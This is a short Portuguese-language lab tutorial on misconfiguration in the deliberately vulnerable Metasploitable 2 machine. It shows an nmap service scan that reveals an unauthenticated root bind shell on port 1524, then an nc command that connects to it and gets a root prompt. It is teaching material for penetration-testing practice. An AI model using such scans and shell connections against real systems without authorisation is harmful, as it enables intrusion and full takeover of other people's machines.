# Missconfiguration

Não é comum, mas o administrador pode deixar alguma 'brecha' aberta por falta de uma configuralção adequada.

Veja o exemplo do lab metasploit2:

```
nmap -sV 192.168.1.33

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 13:42 -03
Nmap scan report for 192.168.1.33
Host is up (0.00021s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
...
1524/tcp open  bindshell   Metasploitable root shell
...
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:C7:CF:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds
 ```

Observamos que a porta 1524 está aberta para conexão de uma shell com user root. Se não houver autenticação para a conexão, teremos acesso a conta root e domínio sobre a máquina.

Usando um comando netcat simples:

```
─$ nc 192.168.1.33 1524                                                                          
root@metasploitable:/# 
```

Temos acesso a máquina metasploitable com o user root.
